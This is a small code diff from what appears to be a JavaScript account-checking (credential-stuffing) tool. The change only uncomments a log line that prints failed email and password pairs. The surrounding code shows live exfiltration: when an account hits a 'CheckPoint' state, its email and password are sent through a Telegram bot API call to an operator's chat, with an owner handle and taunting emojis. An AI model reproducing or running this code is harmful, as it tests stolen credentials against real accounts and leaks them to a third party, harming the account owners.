@@ -76,7 +76,7 @@ async function main() {
                     console.log(colors.yellow(`CheckPoint ${email}:${password}`));
                     await axios.post(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀.Owner @oussamabakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> ${email} \n.🚫. PassWord ==> ${password} \n.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈 هق مشا.`);
                 } else {
-                //    console.log(colors.red(`num => ${email} | pass => ${password}`));
+                  console.log(colors.red(`num => ${email} | pass => ${password}`));
                 }
             };
 
